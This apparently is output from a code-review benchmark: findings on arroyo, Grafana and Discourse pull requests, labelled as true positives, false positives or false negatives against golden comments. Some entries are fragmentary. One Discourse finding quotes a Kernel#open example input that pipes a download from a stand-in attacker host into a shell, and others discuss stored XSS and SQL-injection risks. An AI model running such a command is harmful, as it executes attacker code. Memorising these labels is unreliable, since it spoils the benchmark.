`test_thread_queue_parallel_kafka_offset_commit` drives the consumer by calling `processor._run_once()` in a loop and `processor._shutdown()` at the end. The leading underscore marks these as private arroyo APIs; their names/signatures are not part of arroyo's public contract and can change without warning, breaking this test (and the CI signal it provides) on an arroyo upgrade. Use the public `StreamProcessor.run()` method (which blocks until the consumer stops) instead, with a bounded stop condition or shutdown timeout, so the test exercises the same path real deployments use.

Kafka integration test only waits 5 seconds for 5 messages

In `test_thread_queue_parallel_kafka_offset_commit`, the test produces 5 messages and then runs `processor._run_once()` in a loop for only 5 seconds. The assertions then require that `commit_count >= 1` and that the committed offset reached 5, but the producer flush + consumer rebalance + first poll can easily eat most of that budget on a loaded CI box, producing a flaky test. Wait for `stats["total_items"] == 0` (as the other tests in this file do) before tearing the processor down, and assert on the committed offset only after that condition is met.

max_workers silently coerced to 20 when zero/falsy

`num_queues=max_workers or 20` falls back to 20 whenever `max_workers` is `None`, `0`, or any other falsy value. An operator who passes `--max-workers 0` to disable the new mode will instead get 20 queues/workers started, with no log or error. The fallback should be explicit (`max_workers if max_workers else 20` is functionally the same but at minimum document the behavior, or raise on non-positive values so operators notice the misconfiguration).

Cache key uses hash() which is randomized per Python process

The cache key uses `hash(tuple(sorted(snuba_params.project_ids)))`. Python's built-in `hash()` for tuples is randomized per interpreter process (PYTHONHASHSEED). Consequences: (1) the cache provides no benefit across workers — every request is a miss; (2) `invalidate_upsampling_cache` (line 67) computes the same randomized hash in its caller, so it cannot invalidate entries created by other workers, making the invalidation function dead in practice. false_positives.candidate:
Misleading user-facing error message for disabled SQL expressions

The error message returned when a user submits a QueryTypeSQL is 'sqlExpressions is not implemented'. SQL expressions are in fact implemented (stubs in pkg/expr/sql/db.go); they are disabled for security reasons (CVE-2024-9264). Users who try to use the (documented) SQL Expressions feature will see a message suggesting the feature does not exist, when the actual reason is a security disable. The message should explain that SQL expressions are disabled for security, or at minimum say 'disabled' rather than 'not implemented'.

NewSQLCommand/UnmarshalSQLCommand are direct entry points not gated by the new disable check

The disable check is only added in pkg/expr/reader.go's QueryTypeSQL case. The exported functions NewSQLCommand (line 25) and UnmarshalSQLCommand (line 51) in this file remain callable from any other caller in the codebase without going through that check. Today this is mitigated only by the fact that the new pkg/expr/sql/db.go stubs return 'not implemented' instead of executing SQL, so no DuckDB-backed SQL is run. This is a defense-in-depth concern: any code path (existing or future) that calls NewSQLCommand or UnmarshalSQLCommand directly will reach the stubbed backend, and a future change that re-implements those stubs to call real SQL would re-introduce CVE-2024-9264 without touching reader.go. The same gate (or an explicit early return with the security error) should be enforced inside NewSQLCommand so that disabling SQL expressions cannot be bypassed by callers that don't use ExpressionQueryReader.

TablesList still constructs a DuckDB-flavoured command ('SELECT json_serialize_sql(\'%s\')', rawSQL) and calls the stub DB.RunCommands, which always returns 'not implemented'. Because pkg/expr/reader.go now blocks QueryTypeSQL before this code runs, and pkg/expr/sql/db.go stubs out the execution, there is no live vulnerability. However, the DuckDB-specific command string is now misleading dead code that documents a non-existent backend. It should either be removed (since TablesList will always error), or the function should short-circuit with a clear 'sql expressions are disabled' error before formatting any command, matching the user-facing message returned at pkg/expr/reader.go:131.

true_positives.golden_comment: The GetWebAssets function implements an incomplete double-checked locking pattern for caching web assets. The function first checks if the cache is populated using a read lock (RLock), and if the cache is empty, it acquires a write lock to populate it. However, it fails to re-check whether the cache was populated by another goroutine while waiting to acquire the write lock.
true_positives.matched_candidate:
Double-checked locking is incomplete; concurrent cold-cache callers all redo the I/O

The pattern takes RLock, snapshots the pointer, releases RLock, checks for nil, then takes Lock. After acquiring Lock, the cache is never re-checked. So if N goroutines all observe a nil cache under RLock, they all proceed to perform the file/CDN read in series (since the Lock from line 48 also serializes them) and each overwrites entryPointAssetsCache with its own result. This is functionally correct but wastes I/O and means the first N callers all pay the full initialization cost. Re-check entryPointAssetsCache after acquiring the write lock and early-return if populated, or use sync.Once to gate the load so only the first caller does the work.
true_positives.reasoning: Both identify the missing cache re-check after acquiring the write lock, allowing concurrent cold-cache callers to redundantly populate the cache.

false_positives.candidate:
Write lock held during slow HTTP and filesystem I/O

The write lock acquired at line 48 is held (via defer on line 49) across the potentially slow operations on lines 55-66: an HTTP request via readWebAssetsFromCDN and a filesystem read via readWebAssetsFromFile. Under concurrent requests with a cold cache, every caller will serialize on this single mutex. On a slow disk or CDN, this can cause request pile-up and latency spikes during the first requests after process start. The I/O should happen outside the critical section, with the lock held only for the pointer assignment, e.g. compute the result first, then Lock() briefly to install it.

Cached pointer is shared with all callers; lock only protects the slot, not the contents

The mutex added in this PR only guards the entryPointAssetsCache variable itself. The function returns that exact pointer on every call (line 70), so every caller receives the same *dtos.EntryPointAssets instance, including its JSFiles slice header. Any caller that mutates the returned object (e.g. appending to JSFiles or relying on a copy-on-write assumption) will race against every other concurrent reader and against future cache reads. The PR description says it fixes a data race, but this remaining aliasing is a latent source of the same class of bug; consider returning a copy or documenting the aliasing contract.

false_negatives.golden_comment: In addition to the missing double-check, the function has a critical flaw in its error handling: it unconditionally assigns the fetch result to the cache (line 69: entryPointAssetsCache = result) regardless of whether the fetch succeeded or failed. When an error occurs during asset fetching, result is nil, and this nil value overwrites any previously valid cache entry.

true_positives.golden_comment: The code uses Error log level for what appears to be debugging information. This will pollute error logs in production. Consider using Debug or Info level instead.
true_positives.matched_candidate:
Routine cleanup operations logged at Error level

The new code uses `r.log.Error(...)` for routine, expected cleanup activity. After the change, the cleanup path emits six Error-level log lines per batch (`Annotations to clean by time`, `cleaned annotations by time`, `Annotations to clean by count`, `cleaned annotations by count`, `Tags to clean`, `cleaned tags`). Even when the cleanup succeeds these will be logged at Error level and on production systems they will pollute alerting/log dashboards that key off Error severity for `annotation.test`. The success-path log lines should be Debug or Info; only the failure paths warrant Error.

true_positives.golden_comment: The cleanup job ticker was changed from 10 minutes to 1 minute, which can lead to increased database load and contention due to more frequent execution of cleanup tasks. This change should be reviewed to ensure it aligns with performance expectations.
true_positives.matched_candidate:
Cleanup ticker frequency increased 10x without mention in PR

The cleanup ticker is changed from 10 minutes to 1 minute. This is a 10x increase in the frequency of background cleanup jobs (including the annotation cleanup and other unrelated cleanup jobs that share this ticker). The PR description and linked issue only describe splitting the annotation cleanup query into two statements to avoid MySQL deadlocks; nothing explains why the global cleanup cadence is being changed. This materially increases database load and lock-contention surface, especially given that the new loop in xorm_store.go will keep running batches back-to-back with no throttle until affected==0. The change should be either justified in the PR description or removed; if it is required to compensate for early termination of `untilDoneOrCancelled` under concurrent activity, that should be stated explicitly.
true_positives.reasoning: Both identify the cleanup ticker changing from 10 minutes to 1 minute and the resulting risk of increased database load and contention. The candidate adds context but addresses the same underlying concern.

false_positives.candidate:
'cleaned annotations by time' log message printed even when deleteByIDs fails

The line `r.log.Error("cleaned annotations by time", "count", len(ids), "affected", x, "err", y)` is emitted unconditionally after `deleteByIDs`, including when `y != nil`. Operators reading the log will see a message saying annotations were cleaned alongside an error value, which is contradictory and makes incidents harder to diagnose. The same pattern is repeated on line 557 (`cleaned annotations by count`) and line 579 (`cleaned tags`). The log line should either branch on `err != nil` (different message/level on failure) or use Info/Debug on success and reserve Error for the failure path.

Log line always logs a nil error

Immediately before the `deleteByIDs` call, the code logs `"err", err` where `err` is the result of `fetchIDs`. Because the surrounding block already returned on `if err != nil { return 0, err }`, the value of `err` here is guaranteed to be nil. The `err` field in the structured log is therefore dead/misleading data and should be removed (or replaced with the result of the delete that follows). The same issue exists on lines 554, 557, 576 and 579.

sqliteParameterLimit is wrong: hardcoded 999 instead of 32766 for modern SQLite

The constant `sqliteParameterLimit = 999` is the SQLite compile-time default prior to 3.32, but SQLite >= 3.32 (released 2020) raises the default to 32766, and Grafana's test name explicitly acknowledges this (`should not fail if batch size is larger than SQLITE_MAX_VARIABLE_NUMBER for SQLite >= 3.32.0`). Because of this constant, any configured batch size between 1000 and 32766 will be incorrectly routed into the unsafe string-concatenation path even though parameterized queries would work. The check should use the higher value (or be looked up via the dialect), and the comparison should ideally be against the actual `len(ids)` rather than the configured batch size — a configured batch of 1000 that returns 5 IDs should still use `?` placeholders.

String-concatenated SQL with IDs is fragile pattern even though IDs are int64

In the SQLite fast path, the delete statement is built via `fmt.Sprintf("DELETE FROM %s WHERE id IN (%s)", table, values)` where `values` is constructed by repeatedly formatting `int64` IDs with `%d`. While `%d` on an int64 is safe today, this is a regression from the prior fully-parameterized approach and is fragile: any future change that lets IDs come from a less-trusted source, or that changes the column type, breaks the SQL safety guarantee. The same pattern also bypasses query caching and makes the statement harder to read in slow-query logs. A safer workaround is to chunk the slice into batches of 999 (or 32766) and use placeholders for each chunk.

fetchIDs interpolates table name unescaped into SQL

`fetchIDs` builds `SELECT id FROM %s` and `DELETE FROM %s WHERE id IN (...)` with the `table` argument interpolated directly into the SQL string. Today every call passes the hardcoded literal `"annotation"` or `"annotation_tag"`, so there is no live vulnerability, but the helper accepts a free-form string and there is no whitelist/quoting. A future caller passing user-controlled input (e.g., a table prefix) would create an injection. The function should validate `table` against a fixed allow-list or use the dialect's identifier quoting.

untilDoneOrCancelled terminates early on any zero-affected batch

`untilDoneOrCancelled` exits when `affected == 0`. With the new two-statement design, an entire batch's IDs can be concurrently deleted (or in the MaxCount case, removed by a concurrent delete on a row that shifts the OFFSET) between `fetchIDs` and `deleteByIDs`, producing `affected == 0` while there are still annotations to clean. The comment in the code acknowledges the issue for concurrent inserts, but the same hazard exists for concurrent deletes and is more likely. The cleanup will then stop for the current cycle even though rows remain, relying entirely on the (now 1-minute) ticker to retry. A retry that re-issues the same `fetchIDs` (with fresh IDs) instead of terminating would close this gap.

true_positives.golden_comment: Inconsistency: using name instead of options.Kind for metrics recording differs from other methods.

false_positives.candidate:

When d.Storage.Create fails, the code calls d.recordLegacyDuration(true, mode3Str, options.Kind, method, startStorage) on line 45. This records the failed storage operation's duration into the legacy histogram instead of the storage one. The error path of Create mirrors the success path on line 48 which uses recordStorageDuration, so this looks like a copy/paste mistake. Consequence: a storage outage will be reported in legacy metrics (and not in storage metrics), making on-call dashboards misleading.

Wrong metrics function on storage Update failure

When d.Storage.Update fails, the code calls d.recordLegacyDuration(true, mode3Str, options.Kind, method, startStorage) on line 129. The success path on line 132 uses recordStorageDuration, so this is inconsistent. Unified-storage update failures are reported into the legacy histogram, skewing alerting/dashboards built on those metrics.

Async legacy DeleteCollection duration recorded as storage

Inside the goroutine that calls d.Legacy.DeleteCollection, the result is reported via d.recordStorageDuration(err != nil, mode3Str, options.Kind, method, startLegacy). It should be d.recordLegacyDuration, like the equivalent goroutines in Create (line 56), Update (line 140), and Delete (line 113). Consequence: every DeleteCollection in mode 3 inflates the storage histogram and never appears in the legacy histogram, hiding real legacy-side latency and errors.

Update now lets legacy compute the merge independently of storage

The previous implementation read the current object from storage, called objInfo.UpdatedObject once, and passed the resulting 'updated' object to both Storage.Update and Legacy.Update. The new implementation passes the raw objInfo to d.Legacy.Update on line 139, so each backend will call objInfo.UpdatedObject against its own current state. If the objInfo applies a server-side merge (the normal Kubernetes pattern), the value legacy ends up with depends on what legacy already had, which in mode 3 is whatever the async legacy writes from previous operations have produced. This is a silent divergence risk between the source of truth and the 'safe measure' backup, and it is a behavior change vs. the prior mode 3 implementation that is not called out in the PR description.

Destroy does not wait for in-flight async legacy writes

Destroy calls d.Storage.Destroy() and d.Legacy.Destroy() immediately. Create (line 50), Update (line 134), Delete (line 108), and DeleteCollection (line 161) all spawn goroutines that hold references to d.Legacy and d.Storage and may still be mid-call when Destroy runs. There is no WaitGroup, channel, or context used to coordinate. Consequence: pending legacy writes can race with teardown of the legacy store, producing panics, lost writes, or partially-flushed state on shutdown.

Async legacy write inherits request context and is cancelled with it

Each async legacy goroutine derives its 10s timeout from the request ctx (e.g. line 51: context.WithTimeoutCause(ctx, ...)). If the client disconnects or the request context is cancelled, the legacy write is cancelled immediately, defeating the 'safe measure' purpose: the most common failure mode (client cancellation right after a successful response) is the one that drops the backup. Use context.WithoutCancel(ctx) or context.Background() so the backup write survives request cancellation.

Legacy write errors are swallowed and not retried

In Create (line 55-57), Update (line 139-141), Delete (line 112-114), and DeleteCollection (line 165-167), an error from the legacy store is only fed into a metric and otherwise discarded. There is no log line, no retry, and no mechanism to surface or replay the failure. Consequence: if the legacy store is temporarily unavailable, every successful unified write silently leaves legacy out of sync forever, with no operator-visible signal beyond the metric counter.

Tests do not verify that legacy is called for any write

In TestMode3_Create (line 65), TestMode3_Update (line 345), TestMode3_Delete (line 230), and TestMode3_DeleteCollection (line 284) the test asserts only on the storage-side return value. None of them wait on the async goroutine or assert that the legacy mock expectation was actually hit (e.g. with m.AssertCalled or m.AssertExpectations). If a future refactor drops the async legacy call, or if the goroutine is silently cancelled by the test's context, they would still pass. The test names also describe 'unified store only', which contradicts the mode 3 contract.

Update goroutine measures startLegacy before defer cancel is registered

Inside the Update goroutine (lines 134-141) the order is: create ctx/cancel, set startLegacy := time.Now(), defer cancel(). The defer is registered AFTER startLegacy is captured, so the recorded duration excludes the cancel defer registration but the other three goroutines (Create, Delete, DeleteCollection) place defer cancel() before capturing startLegacy. The captured time now includes the WithTimeoutCause call, inflating the legacy histogram for Update specifically and being inconsistent with the other verbs.

Line 289 in `useAbilities.ts` reads: `const { isEditable, isRemovable, loading } = useIsGrafanaPromRuleEditable(rule); // duplicate`. The trailing `// duplicate` looks like a leftover TODO/scratchpad marker. It is meaningless to future readers and should be removed or replaced with an explanatory comment.

The test on line 112 of shardQuerySplitting.test.ts even pins this in place with expect(datasource.applyTemplateVariables).toHaveBeenCalledTimes(5). The test pins expect(datasource.applyTemplateVariables).toHaveBeenCalledTimes(5), which depends on the exact number of shard groups produced by the specific fetchLabelValues fixture plus the 1+N pattern above. true_positives.golden_comment: Race condition: Multiple concurrent requests could pass the device count check simultaneously and create devices beyond the limit. Consider using a database transaction or lock.
true_positives.matched_candidate:
TOCTOU race allows device limit to be exceeded

CreateOrUpdateDevice first calls CountDevices to check whether the configured deviceLimit has been reached, then, if under limit, runs an unconditional INSERT...ON CONFLICT. These two operations run in separate sessions with no locking, so under concurrent anonymous authentications several requests can all observe count < deviceLimit and proceed to insert new rows, exceeding the configured limit by however many requests race in the same window. With limit=10 a burst of new device IDs can easily push the table to 12-15 active devices. The limit cannot be safely enforced in application code in this shape; it needs either a single atomic statement (e.g. INSERT ... SELECT with a count check in a CTE, plus a database transaction), a row-level lock, or a unique constraint plus a DB trigger.
true_positives.reasoning: Both identify the same race condition: concurrent requests can pass the device count check before inserting, causing the device limit to be exceeded. Both recommend database-level synchronization to enforce the limit.

true_positives.golden_comment: The `tagDeviceUI` function populates the local cache with the device ID before the `CreateOrUpdateDevice` call. If `ErrDeviceLimitReached` is returned, the cache entry remains set, allowing subsequent requests to bypass the device limit until the cache expires after 29 minutes.
true_positives.matched_candidate:
localCache is set before the DB call, so ErrDeviceLimitReached is silently bypassed on the next request

tagDeviceUI writes a.localCache.SetDefault(key, struct{}{}) before invoking CreateOrUpdateDevice and returns nil on cache hit. Combined with the new ErrDeviceLimitReached returned by the store, this means: the first request from a brand-new device when the limit is reached sets the cache and fails authentication; the very next request from the same device within the 29 minute cache TTL hits the cache, tagDeviceUI returns nil, TagDevice returns nil, and Authenticate returns a valid identity. The device limit is therefore defeated simply by retrying once. The cache entry needs to either track failure (return the cached error on subsequent hits, or only populate the cache after a successful tag) so the rejection is enforced for the full TTL.
true_positives.reasoning: Both identify the same cache-poisoning bug: tagDeviceUI caches the device before CreateOrUpdateDevice succeeds, leaving the entry after ErrDeviceLimitReached and allowing subsequent requests to bypass the device limit during the 29-minute TTL.

Synchronous DB write and removed panic recovery in the anonymous auth path is a regression

The previous implementation invoked TagDevice from a goroutine with a panic recover and a 2-minute timeout, so anonymous authentication never blocked on a DB write. This PR removes the goroutine and the recover and calls TagDevice synchronously on the request context. Every anonymous request now performs an INSERT/UPDATE in the auth hot path: DB latency directly adds to login latency, a slow or unreachable DB will deny anonymous logins instead of just losing the tag, and any panic inside TagDevice now propagates to the auth handler. This is a notable behavior change that the description and reviewer checklist do not call out.

anonymousDeviceLimit is typed as number | undefined but the backend always emits a number

The Go DTO declares AnonymousDeviceLimit int64 (non-pointer, no omitempty), so the /api/frontend/settings endpoint always serializes a number, never omits the field. The TypeScript field anonymousDeviceLimit: number | undefined plus the runtime default anonymousDeviceLimit = undefined are inconsistent with this: the frontend will always receive a concrete number (0 for unlimited, or the configured value), and never undefined. Either change the DTO to *int64 with omitempty to truly support undefined, or fix the TS types/defaults to number with 0 default so the contract matches what the API actually sends.

TestIntegrationBeyondDeviceLimit only runs two sequential CreateOrUpdateDevice calls. The whole correctness story of the limit hinges on the check-then-insert in CreateOrUpdateDevice being safe under concurrent load, and on the local cache correctly handling ErrDeviceLimitReached on retry. Neither is covered: there is no parallel test that fires N goroutines with unique device IDs against a small limit and asserts the resulting count, and no test that calls CreateOrUpdateDevice twice with a cache layer to assert that the second call after ErrDeviceLimitReached still returns the error. Without these, the race and the cache-bypass bugs above can regress silently.

The reviewer checklist explicitly asks to confirm docs are updated and this is not done. Users will have no way to discover or understand the setting, and operators who turn it on will be surprised that anonymous access starts returning errors when the limit is hit.

No tests for new localization fallback feature

This PR adds a new server-side localization fallback mechanism (custom FallbackLocaleList, ensure_loaded! chain, integration with the patched I18n translate accelerator), but no specs are included in the diff. Regression risks include: (1) FallbackLocaleList#[] ordering/duplication with current_user.effective_locale vs SiteSetting.default_locale vs :en; (2) Pluralization/Fallbacks module composition when both are mixed into I18n::Backend::Simple; (3) thread-safety of ensure_loaded! running inside a per-request before_filter that touches @loaded_locales and LOAD_MUTEX; (4) cache key stability under fallback (translate_no_cache returning fallback-locale values while the LRU cache is keyed only by config.locale). A feature of this scope touching the I18n initialization order needs explicit coverage before merge.

FallbackLocaleList#[] crashes if SiteSetting.default_locale is nil

FallbackLocaleList#[] unconditionally calls SiteSetting.default_locale.to_sym and embeds the result in the fallback chain. If SiteSetting.default_locale is nil or an empty string (e.g. a half-applied migration, a misconfigured SiteSetting row, or a unit test that stubs the setting), this raises NoMethodError or returns [:en] without the site locale, silently degrading fallback behavior for every request that goes through the before_filter. The method should defend against nil/blank values (treat them as :en or skip), or the initializer should validate SiteSetting.default_locale at boot.

FallbackLocaleList is a Hash subclass but only [] is overridden

FallbackLocaleList < Hash overrides [] to return an Array, but inherits Hash semantics for everything else (keys, each, merge, []=, store, dig, etc.) while the underlying hash stays empty. I18n::Backend::Fallbacks and other code may call e.g. I18n.fallbacks[locale] = [...] or iterate keys; those calls will silently no-op or return empty results, masking configuration mistakes. Additionally, since the override is not synchronized, two threads can compute the fallback list concurrently while reading SiteSetting.default_locale - benign today but a footgun if the override ever grows. Either delegate to a plain object exposing only the contract Fallbacks needs, or override the full Hash surface and freeze the per-locale list.

Fallback locales are force-loaded on every request via before_filter

ApplicationController#set_locale ends with I18n.fallbacks.ensure_loaded!, which calls I18n.ensure_loaded! for every locale in the user's fallback chain on every request. While @loaded_locales.include? short-circuits after the first request, the very first request after boot (and after each I18n.reload!) must parse all fallback yml files inside the request path, inflating TTFB and competing for LOAD_MUTEX with concurrent requests. The fallback translations only need to be loaded once at boot (or lazily before the first translate for that locale); the before_filter should not be the trigger. Consider moving ensure_loaded! out of the request path or gating it behind a once-per-process flag.

That branch contains the most complex logic in the method — `website_host.split('.')[1..-1].join('.') == discourse_host.split('.')[1..-1].join('.') ? website_host + URI(website.to_s).path : website_host` — and has both a true and false outcome that should be verified, e.g., `Discourse.current_hostname = 'forum.example.com'` with website `http://www.example.com/user` (should yield `www.example.com/user`) and with website `http://www.other.com/user` (should yield `www.other.com`, no path).

The trailing-slash inconsistency in particular means two visually identical URLs (one with, one without `/`) render different display text on the profile, which would surprise users and is worth either a test or explicit normalization in the serializer.

true_positives.golden_comment: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.
true_positives.matched_candidate:
postMessage targetOrigin should be origin only, not referer URL

The `postMessage` call uses `'<%= request.referer %>'` as the `targetOrigin` argument. `targetOrigin` should be a serialized origin (scheme + host + port) or `*`. Passing the full referer URL works in browsers because they parse the string down to its origin, but the correct and safe value is explicitly the origin. Worse, when `request.referer` is nil/empty (which `ensure_embeddable` allows when there is no Referer header), the rendered value becomes `parent.postMessage(..., '')`. An empty string is treated as `"*"` by browsers, causing the resize message to be sent to any window that has registered a `message` listener — a small but real information leak (the Discourse iframe's pixel height to any opener/parent). Render the referer's origin (e.g. `"#{URI(request.referer || '').scheme}://#{URI(request.referer || '').host}"`) and bail out (or send `null` height) when referer is missing.
true_positives.reasoning: Both identify passing the full referrer URL as postMessage's targetOrigin instead of its origin. The candidate disputes the golden comment's message-dropping consequence and adds another concern, but identifies the same underlying code issue.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. A single malformed feed entry aborts the entire hourly poll job for the rest of the items in the batch and may surface in error reports. false_positives.candidate:
Kernel#open on user-controlled URL allows command execution

`rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` invokes `Kernel#open` on the configured feed URL. Ruby's `Kernel.open` treats a leading `|` as a subshell command, so an admin who pastes or copy-pastes a URL like `|curl evil.com/x | sh` (or `|something`) into `feed_polling_url` will execute it as the Ruby process (which is the Rails/web process — typically the Discourse user, often with access to the DB and `Rails.env` secrets). Later versions of Discourse explicitly replace `Kernel.open` and `OpenURI.open_uri` everywhere this pattern appears for exactly this reason. Use `URI.open(SiteSetting.feed_polling_url)` (OpenURI) or an explicit HTTP client, with a redirect/host allowlist and size/time limits, instead of `Kernel.open`.

raw_html cook_method bypasses sanitization, enabling stored XSS

In `Post#cook`, when `cook_method == Post.cook_methods[:raw_html]` the method returns `raw` verbatim, skipping `post_analyzer.cook(*args)` which is what normally runs sanitization (whitelisted image classes, host-aware link rewriting, etc.). The `TopicEmbed.import` flow (called from `TopicEmbed.import_remote` → `ruby-readability`, and from `Jobs::PollFeed` over fetched RSS items) creates these posts with `cook_method: Post.cook_methods[:raw_html]` and stores the upstream raw HTML as `raw`. Any HTML/JS present in the trusted-but-compromised source (a hijacked blog post, a malicious RSS entry, etc.) is therefore rendered to every visitor of the embed iframe, and because `best.html.erb` renders with `<%= raw post.cook %>`, nothing in the rendering path will scrub it. This is stored XSS inside the Discourse origin. At minimum, the `raw_html` branch must run the same sanitizer `cook` applies for regular posts (e.g. `PostAnalyzer.new(raw, topic_id).cook`), or, better, the cook_method selector should reject generic HTML and only accept a constrained subset.

`var comments = document.getElementById('discourse-comments')` is dereferenced at `comments.appendChild(iframe)` without a null check. If a third-party site embeds the script before the `#discourse-comments` div exists (wrong placement, dynamic page where the div hasn't been rendered yet, etc.), the script crashes on the `null.appendChild(...)` call and the rest of the IIFE — including the `postMessage` listener — never runs, so the embed silently fails and the iframe can never self-resize. Guard the append: `if (comments) { comments.appendChild(iframe); } else { document.body.appendChild(iframe); }`.

absolutize_urls corrupts protocol-relative URLs

`absolutize_urls` only absolutizes `href`/`src` values that `start_with?('/')`. Protocol-relative URLs like `//cdn.example.com/img.jpg` match that check but then `href.sub(/^\/+/, '')` strips every leading slash, so a value that is supposed to point at `https://cdn.example.com/img.jpg` is rewritten into `https://example.comcdn.example.com/img.jpg`. The link appears to be a same-origin resource, which is both broken (the image fails to load) and a small URL-confusion issue because the rendered URL points at the embed host. Detect protocol-relative inputs explicitly: `a['href'] = href.sub(/^\/+/, '/') if href.start_with?('//')` (keep the leading `//`) and append to `prefix` instead of inserting a literal slash.

TTL is set only on the racing process; throttle window is effectively unbounded

`retrieved_recently?` uses `SETNX` followed by `EXPIRE 60`. Between the `SETNX` and the `EXPIRE`, the key has no TTL — if the process dies in that gap (Sidekiq worker killed, VM paused) the key persists forever with the value `"1"`, and every subsequent attempt to retrieve that same embed URL will be silently throttled indefinitely because `invalid_host?` is the only other gate and the throttle check returns `true` first. Move the TTL into a single atomic call: `$redis.set(retrieved_key, '1', nx: true, ex: 60)` so the key is always created with its expiration. Additionally, the inverse race exists: two workers can both pass `retrieved_recently?` returning false simultaneously before either `SETNX` runs, and both will go on to call `TopicEmbed.import_remote` — the unique index on `topic_embeds.embed_url` is the only thing protecting against the double-import, and `TopicEmbed.import` calls `PostCreator.create` with side effects (notifications, draft sequence, message_bus publish) that aren't rolled back by the unique-index failure. These two issues combined mean the throttle provides at most a 60-second fence, not a deduplication guarantee, despite the name.

perform_retrieve runs the entire RSS poll synchronously inside a single embed import

`TopicRetriever#perform_retrieve` does `Jobs::PollFeed.new.execute({})` whenever feed polling is enabled. That job imports every item in the entire RSS feed in a single call — fetching and cooking N remote pages even when this retriever only cares about one specific `embed_url`. For a feed with dozens of entries the embedding request stalls for minutes, blocking the Sidekiq worker, and on every cached re-fetch the whole feed is re-iterated. Filter inside `poll_feed` (or split it into two methods, one keyed by URL) so the synchronous embed path only fetches the requested entry.

`require_dependency 'email/sender'` is added at the top of the RetrieveTopic job but the job does not use the `Email::Sender` class (or anything else from the email stack) anywhere in this file. It appears to be a copy/paste leftover from another job. Keeping it loads the email autoload subtree unnecessarily on every Sidekiq run of this class and confuses readers searching for the dependency chain.
